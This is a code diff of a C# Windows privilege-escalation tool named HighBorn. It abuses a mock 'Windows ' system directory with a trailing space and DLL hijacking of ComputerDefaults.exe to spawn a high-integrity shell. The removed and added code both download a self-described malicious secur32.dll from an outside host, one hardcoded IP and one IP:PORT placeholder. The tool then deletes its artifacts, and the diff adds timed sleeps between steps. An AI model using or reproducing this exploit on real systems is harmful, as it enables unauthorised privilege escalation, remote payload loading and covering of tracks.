@@ -4,8 +4,6 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Net;
 
-
-
 namespace HighBorn
 {
     class HighBorn
@@ -25,12 +23,31 @@ namespace HighBorn
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);
-       
-	    [DllImport("kernel32.dll", SetLastError = true)]
+
+        [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool RemoveDirectory(string lpPathName);
 
-		
-	
+        [DllImport("ntdll.dll")]
+        public static extern int NtDelayExecution(bool Alertable, ref long DelayInterval);
+
+        [DllImport("ntdll.dll")]
+        public static extern int ZwSetTimerResolution(uint RequestedResolution, bool Set, out uint ActualResolution);
+
+        private static bool isResolutionSet = false;
+
+        static void SleepShort(float milliseconds)
+        {
+            if (!isResolutionSet)
+            {
+                uint actualResolution;
+                ZwSetTimerResolution(1, true, out actualResolution);
+                isResolutionSet = true;
+            }
+
+            long interval = (long)(-1 * milliseconds * 10000.0f); // Convert to 100-nanosecond intervals
+            NtDelayExecution(false, ref interval);
+        }
+
         public static void Main(string[] args)
         {
             IntPtr wow64Value = IntPtr.Zero;
@@ -47,13 +64,14 @@ namespace HighBorn
             {
                 Console.WriteLine("[-] Unable to create directories");
             }
-			
-			
-			Console.WriteLine("[^] Copying Executable Into Mock Directory");
+
+            SleepShort(2000); // Sleep for 2 seconds
+
+            Console.WriteLine("[^] Copying Executable Into Mock Directory");
             try
             {
-            
-			CopyFile(@"C:\Windows\System32\ComputerDefaults.exe", @"C:\Windows \System32\ComputerDefaults.exe", true);
+
+                CopyFile(@"C:\Windows\System32\ComputerDefaults.exe", @"C:\Windows \System32\ComputerDefaults.exe", true);
 
             }
             catch
@@ -61,40 +79,47 @@ namespace HighBorn
                 Console.WriteLine("[-] Unable to create the mock directories");
             }
 
-			Console.WriteLine("[^] Downloading Malicious DLL");
-            try
-			{
-			using (WebClient webClient = new WebClient())
-				{
-					webClient.DownloadFile("http://172.16.202.178:9090/secur32.dll", @"C:\Windows\temp\secur32.dll");
-				}
-			}
-			catch
-			{
-				Console.WriteLine("[^] DLL Downloaded");
-			}	
-			
-			CopyFile(@"C:\Windows\temp\secur32.dll", @"C:\Windows \System32\secur32.dll", true);
-			
-			Console.WriteLine("[^] Spawining High Integrity Shell");
+            SleepShort(2000); // Sleep for 2 seconds
+
+            Console.WriteLine("[^] Downloading Malicious DLL");
             try
             {
-            		Process.Start(@"C:\Windows \System32\ComputerDefaults.exe").WaitForExit();
+                using (WebClient webClient = new WebClient())
+                {
+                    webClient.DownloadFile("http://IP:PORT/secur32.dll", @"C:\Windows\temp\secur32.dll");
+                }
             }
             catch
             {
-                Console.WriteLine("[-] Shell fucked up");
+                Console.WriteLine("[^] DLL Downloaded");
             }
 
-            Console.WriteLine("[^] Cleaning Up");
-		
-            	DeleteFileW(@"C:\Windows\temp\secur32.dll");
-        	DeleteFileW(@"C:\Windows \System32\ComputerDefaults.exe");
-		DeleteFileW(@"C:\Windows \System32\secur32.dll");
-		RemoveDirectory(@"C:\Windows \System32\");
-		RemoveDirectory(@"C:\Windows \");
+            CopyFile(@"C:\Windows\temp\secur32.dll", @"C:\Windows \System32\secur32.dll", true);
 
-            
+            SleepShort(2000); // Sleep for 2 seconds
+
+            Console.WriteLine("[^] Spawning High Integrity Shell");
+            try
+            {
+                Process.Start(@"C:\Windows \System32\ComputerDefaults.exe").WaitForExit();
+            }
+            catch
+            {
+                Console.WriteLine("[-] Shell messed up");
+            }
+
+            SleepShort(2000); // Sleep for 2 seconds
+
+            Console.WriteLine("[^] Cleaning Up");
+
+            DeleteFileW(@"C:\Windows\temp\secur32.dll");
+	    SleepShort(2000);
+            DeleteFileW(@"C:\Windows \System32\ComputerDefaults.exe");
+            SleepShort(2000);
+	    DeleteFileW(@"C:\Windows \System32\secur32.dll");
+            RemoveDirectory(@"C:\Windows \System32\");
+            RemoveDirectory(@"C:\Windows \");
+
             Wow64RevertWow64FsRedirection(wow64Value);
         }
     }
